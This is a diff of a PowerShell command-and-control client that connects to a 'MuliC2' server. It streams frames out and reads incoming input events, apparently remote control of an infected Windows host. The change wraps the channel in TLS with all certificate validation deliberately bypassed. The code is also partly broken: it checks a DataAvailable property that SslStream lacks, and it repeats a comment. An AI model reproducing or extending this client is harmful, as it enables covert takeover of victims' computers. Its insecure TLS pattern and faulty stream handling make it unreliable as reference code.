@@ -24,14 +24,14 @@ function Start-Cleanup {
     
     Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
     
-    try {
-        if ($global:networkStream) {
-            $global:networkStream.Close()
-            $global:networkStream.Dispose()
-            $global:networkStream = $null
+        try {
+        if ($global:sslStream) {
+            $global:sslStream.Close()
+            $global:sslStream.Dispose()
+            $global:sslStream = $null
         }
     } catch {
-        Write-Host "[!] Error closing network stream: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Error closing SSL stream: $($_.Exception.Message)" -ForegroundColor Red
     }
     
     try {
@@ -56,7 +56,7 @@ $null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKe
 }
 
 $global:tcpClient = $null
-$global:networkStream = $null
+$global:sslStream = $null
 $global:isRunning = $true
 $global:cleanupInProgress = $false
 $global:lastFrameTime = Get-Date
@@ -106,7 +106,7 @@ public class Win32API {
 
 function Test-Connection {
     try {
-        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:networkStream -and $global:networkStream.CanWrite)
+        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:sslStream -and $global:sslStream.CanWrite)
     } catch {
         return $false
     }
@@ -119,7 +119,7 @@ function Connect-ToServer {
         Write-Host "[*] Connecting to MuliC2 server at ${C2Host}:${C2Port}..." -ForegroundColor Cyan
         
         # Clean up existing connection
-        if ($global:networkStream) { $global:networkStream.Close(); $global:networkStream.Dispose() }
+        if ($global:sslStream) { $global:sslStream.Close(); $global:sslStream.Dispose() }
         if ($global:tcpClient) { $global:tcpClient.Close(); $global:tcpClient.Dispose() }
         
         $global:tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -150,12 +150,19 @@ function Connect-ToServer {
         $socket.NoDelay = $true
         $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
         
-        # Get network stream
-        $global:networkStream = $global:tcpClient.GetStream()
-        $global:networkStream.ReadTimeout = 1000
-        $global:networkStream.WriteTimeout = 5000
+        # Get network stream and upgrade to TLS
+        $global:sslStream = New-Object System.Net.Security.SslStream($global:tcpClient.GetStream(), $false, {
+            param($sender, $certificate, $chain, $sslPolicyErrors)
+            return $true  # Accept all certificates (bypass validation)
+        })
         
-        Write-Host "[+] TCP connection established" -ForegroundColor Green
+        # Authenticate as client (bypass certificate validation)
+        $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+        
+        $global:sslStream.ReadTimeout = 1000
+        $global:sslStream.WriteTimeout = 5000
+        
+        Write-Host "[+] TLS connection established" -ForegroundColor Green
         $global:reconnectAttempts = 0
         return $true
         
@@ -179,7 +186,7 @@ function Send-Frame {
     try {
         # Send frame length header
         $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
-        $global:networkStream.Write($lenBytes, 0, 4)
+        $global:sslStream.Write($lenBytes, 0, 4)
         
         # Send frame data in chunks to avoid buffer overflow
         $chunkSize = 8192
@@ -189,16 +196,17 @@ function Send-Frame {
             $remainingBytes = $frameBytes.Length - $totalSent
             $currentChunkSize = [Math]::Min($chunkSize, $remainingBytes)
             
-            $global:networkStream.Write($frameBytes, $totalSent, $currentChunkSize)
+            $global:sslStream.Write($frameBytes, $totalSent, $currentChunkSize)
             $totalSent += $currentChunkSize
+            
+            # Small delay between chunks to prevent overwhelming the connection
+            $global:sslStream.Flush()
             
             # Small delay between chunks to prevent overwhelming the connection
             if ($remainingBytes -gt $chunkSize) {
                 Start-Sleep -Milliseconds 1
             }
         }
-        
-        $global:networkStream.Flush()
         return $true
         
     } catch {
@@ -455,13 +463,13 @@ try {
         $currentTime = Get-Date
         
         # Handle input events (non-blocking)
-        if ((Test-Connection) -and $global:networkStream.DataAvailable) {
+        if ((Test-Connection) -and $global:sslStream.DataAvailable) {
             try {
                 # Read message length
                 $lengthBytes = New-Object byte[] 4
                 $totalRead = 0
-                while ($totalRead -lt 4 -and $global:networkStream.DataAvailable) {
-                    $bytesRead = $global:networkStream.Read($lengthBytes, $totalRead, 4 - $totalRead)
+                while ($totalRead -lt 4 -and $global:sslStream.DataAvailable) {
+                    $bytesRead = $global:sslStream.Read($lengthBytes, $totalRead, 4 - $totalRead)
                     if ($bytesRead -eq 0) { break }
                     $totalRead += $bytesRead
                 }
@@ -473,7 +481,7 @@ try {
                         $msgBytes = New-Object byte[] $msgLength
                         $totalRead = 0
                         while ($totalRead -lt $msgLength) {
-                            $bytesRead = $global:networkStream.Read($msgBytes, $totalRead, $msgLength - $totalRead)
+                            $bytesRead = $global:sslStream.Read($msgBytes, $totalRead, $msgLength - $totalRead)
                             if ($bytesRead -eq 0) { break }
                             $totalRead += $bytesRead
                         }
